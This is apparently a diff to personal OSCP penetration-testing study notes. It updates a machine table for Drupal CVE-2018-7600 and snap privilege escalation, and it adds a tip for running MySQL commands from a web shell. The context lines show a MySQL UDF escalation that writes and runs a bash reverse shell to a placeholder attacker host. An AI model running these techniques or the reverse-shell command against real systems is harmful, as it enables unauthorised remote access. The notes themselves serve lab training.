@@ -11,7 +11,7 @@ https://github.com/tedchen0001/OSCP-Notes/blob/master/AD.md
 | Machine | Enumeration | Privilege Escalation |
 | ------------- | ------------- | ------------- |
 | Admirer | web dir enum, [Adminer](https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/) MySQL(local) | sudo list ```SETENV```, Hijacking Python Library ```PYTHONPATH``` | 
-| Armageddon | Drupal (2018-7600) | binary snap |
+| Armageddon | Drupal [(CVE-2018-7600)](https://github.com/pimps/CVE-2018-7600), credential in config file, MySQL | sudo list, snap |
 | Backdoor | wordpress LFI proc gdbserver | screen |
 | Blocky | dirb javadecompilers wordpress | sudo list |
 | Blunder | feroxbuster extensions ```txt``` bludit | sudo versions before 1.8.28 |
@@ -557,4 +557,11 @@ create function do_system returns integer soname 'raptor_udf2.so';
 select * from mysql.func;
 # chagne reverse shell command
 select do_system('echo ''/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh');
+```
+
+Used in `Armageddon`
+
+```shell
+# In web shell we need to use full sql command
+mysql -u "<username>" -h "localhost" "<passowrd>" "<database>" -e "<sql command>"
 ```
